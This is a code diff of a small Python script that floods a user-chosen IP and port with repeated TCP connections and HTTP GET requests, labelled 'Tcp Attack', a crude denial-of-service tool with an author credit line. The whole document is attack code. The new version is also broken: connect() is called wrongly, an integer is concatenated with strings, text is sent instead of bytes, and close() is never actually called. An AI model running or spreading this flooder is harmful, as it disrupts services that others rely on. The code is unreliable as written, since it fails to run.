@@ -1,18 +1,17 @@
-import socket, os, sys
+import socket
 
-ip = sys.argv[1]
-port = sys.argv[2]
+print('Credit By RetZ.')
+ip = str(input('Ip: '))
+port = int(input('Port: '))
+times = int(input('Times: '))
 
-print "][ Attacking " + ip + " ... ]["
-print "injecting " + port;
-def attack(): 
-  #pid = os.fork()
+def tcp():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((sys.argv[1], 80))
-  print ">> GET /" + port + " HTTP/1.1"
+  s.connect(ip, port)
   s.send("GET /" + port + " HTTP/1.1\r\n")
   s.send("Host: " + ip + "\r\n\r\n");
-  s.close()
-  
-for i in range(1, 10000):
-  attack() 
+  print("\033[1;36;40mTcp Attack To IP", ip, "PORT", port)
+  s.close
+
+for i in range(1, times):
+  tcp()
